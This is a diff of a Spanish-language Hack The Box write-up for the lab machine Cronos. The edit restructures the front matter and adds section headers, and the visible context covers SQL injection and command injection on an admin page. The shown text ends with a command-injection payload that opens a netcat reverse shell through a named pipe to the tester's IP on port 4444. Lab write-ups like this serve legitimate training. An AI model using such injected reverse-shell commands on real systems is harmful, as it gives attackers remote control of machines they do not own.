@@ -1,9 +1,27 @@
 ---
-title: "Cronos - WriteUp"
-date: Sat Aug 23 2025 09:45:00 GMT+0200 (Central European Summer Time)
-categories: [WriteUps, HTB, Linux]
-tags: [ctf, nmap, htb, reverse-shell, impacket, linpeas, exploit, wfuzz, pspy, apache]
-image: /assets/img/htb-writeups/Pasted-image-20240202171303.png
+title: Cronos - WriteUp
+date: 'Sat, 23 Aug 2025 00:00:00 GMT'
+categories:
+  - WriteUps
+  - HTB
+  - Linux
+tags:
+  - ctf
+  - nmap
+  - htb
+  - reverse-shell
+  - impacket
+  - linpeas
+  - exploit
+  - wfuzz
+  - pspy
+  - apache
+image: /assets/img/cabeceras/2025-08-23-CRONOS-WRITEUP.png
+description: >-
+  CronOS se centra principalmente en diferentes vectores de enumeración y
+  también enfatiza los riesgos asociados con la adición de archivos con permisos
+  de escritura universal al crontab raíz. Este equipo también presenta una
+  vulnerabilidad de inyección SQL de nivel inicial.
 ---
 
 {% include machine-info.html
@@ -13,23 +31,8 @@ image: /assets/img/htb-writeups/Pasted-image-20240202171303.png
   platform="HTB"
 %}
 
-![Cronos](/assets/img/htb-writeups/Pasted-image-20240202171303.png)
 
----
-
----
-
-Tags: 
-
-----
-
-![CRONOS](/assets/img/htb-writeups/Pasted-image-20240202171303.png)
-
-#### Acerca de Cronos:
-
-CronOS se centra principalmente en diferentes vectores de enumeración y también enfatiza los riesgos asociados con la adición de archivos grabables en todo el mundo al crontab raíz. Esta máquina también incluye una vulnerabilidad de inyección SQL de nivel introductorio.
-
---------
+## Enumeración
 
 NMAP
 
@@ -133,6 +136,8 @@ Damos de alta los subdominios en hosts y seguimos...
 http://admin.cronos.htb/
 ```
 
+## Explotación
+
 ![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205125435.png)
 
 Probamos una inyección SQL sencilla 
@@ -162,7 +167,9 @@ Al ver que responde podemos pensar que la web es vulnerable al command injection
 
 Pues parece que sí, pues vamos a intentar enviarnos una consola remota:
 
-Nos ponemos a la escucha con netca o penelope por el puerto que queramos y ejecutamos el comando:
+## Escalada
+
+Nos ponemos a la escucha con netcat o penelope por el puerto que queramos y ejecutamos el comando:
 
 ```
 10.10.14.61; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.61 4444 >/tmp/f
